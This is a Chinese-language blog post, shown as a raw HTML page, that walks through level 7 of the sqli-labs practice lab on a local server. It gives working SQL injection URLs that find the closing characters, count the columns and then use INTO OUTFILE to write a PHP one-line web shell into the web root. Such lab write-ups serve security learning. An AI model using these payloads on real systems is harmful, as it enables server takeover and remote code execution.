@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>sqli-labs关卡/sqli-labs第七关GET盲注 | 栈桥仔</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="我们先进入第七关，这里提示错误说我们没有输入带参数的ID值。  我们输入?id&#x3D;1,页面返回了You are in…. Use outfile……  上面返回了You are in…. Use outfile……而outfile是mysql里面向系统写入文件的函数，然后我们可以尝试写入一句话木马 在写入木马前，先确定注入点，我们经常使用 ‘  “ ) ] 或者其他组合进行闭合，并且在后面加上 an">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs关卡&#x2F;sqli-labs第七关GET盲注">
+<meta property="og:url" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/index.html">
+<meta property="og:site_name" content="栈桥仔">
+<meta property="og:description" content="我们先进入第七关，这里提示错误说我们没有输入带参数的ID值。  我们输入?id&#x3D;1,页面返回了You are in…. Use outfile……  上面返回了You are in…. Use outfile……而outfile是mysql里面向系统写入文件的函数，然后我们可以尝试写入一句话木马 在写入木马前，先确定注入点，我们经常使用 ‘  “ ) ] 或者其他组合进行闭合，并且在后面加上 an">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318790283.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318897307.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319473364.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319618537.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319857727.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322414102.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322775021.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323522741.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323835292.png">
+<meta property="og:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323882223.png">
+<meta property="article:published_time" content="2020-07-25T01:18:02.362Z">
+<meta property="article:modified_time" content="2020-03-16T08:44:47.499Z">
+<meta property="article:author" content="zhanqiaozai">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318790283.png">
+  
+    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author">zhanqiaozai</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-sqli-labs关卡/sqli-labs第七关GET盲注" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/" class="article-date">
+  	<time datetime="2020-07-25T01:18:02.362Z" itemprop="datePublished">2020-07-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sqli-labs关卡/sqli-labs第七关GET盲注
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>我们先进入第七关，这里提示错误说我们没有输入带参数的ID值。</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318790283.png" alt="1584318790283"></p>
+<p>我们输入?id=1,页面返回了You are in…. Use outfile……</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318897307.png" alt="1584318897307"></p>
+<p>上面返回了You are in…. Use outfile……而outfile是mysql里面向系统写入文件的函数，然后我们可以尝试写入一句话木马</p>
+<p>在写入木马前，先确定注入点，我们经常使用 ‘  “ ) ] 或者其他组合进行闭合，并且在后面加上 and 1=1–+或and 1=2–+ 进行判断闭合的正确性，例如：如果?id=1* and 1=1–+为真，且?id* and 1=2–+为假，那么*字符串就是有效的闭合符，</p>
+<p>经过测试我们发现’))字符串可以闭合</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319473364.png" alt="1584319473364"></p>
+<p>然后进行测试字段数，使用order by来测试字段数，我们先尝试输入4，发现返回错误，</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319618537.png" alt="1584319618537"></p>
+<p>然我在尝试输入3试一下，发现返回正确，我们可以确定当前字段是3</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319857727.png" alt="1584319857727"></p>
+<p>然后我们插入一个文本试试，发现成功地插入了，虽然显示报错了，但是已经插入了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\test.txt&quot; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322414102.png" alt="1584322414102"></p>
+<p>我们可以查看一下，成功地导入了文本</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322775021.png" alt="1584322775021"></p>
+<p>我们现在导入一句话木马，发现也是已经存在了一句话木马，已经成功地导入进去了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">其中一句话木马两边的单引号必须加不然无法导入</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;123&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\test.php&quot;--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323522741.png" alt="1584323522741"></p>
+<p>我们查看一下php文本里面是否有我们写入的一句话木马，可以发现我们插入的一句话木马已经存在了，虽然没有显示出来，但确实存在了，我们打开php文件看一下</p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323835292.png" alt="1584323835292"></p>
+<p>发现确实导入了一句话木马，select……into outfile “地址”的方式插入了一句话木马到服务器，这一用法在我们实战环节中经常会用到。 </p>
+<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323882223.png" alt="1584323882223"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%89%E5%85%B3GET%E8%81%94%E5%90%88/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          sqli-labs关卡/sqli-labs第三关GET联合
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sqli-labs关卡/sqli-labs第一关GET联合</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="sqli-labs关卡/sqli-labs第七关GET盲注" data-title="sqli-labs关卡/sqli-labs第七关GET盲注" data-url="https://zhanqiaozai.github.io/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="sqli-labs关卡/sqli-labs第七关GET盲注">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 zhanqiaozai
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
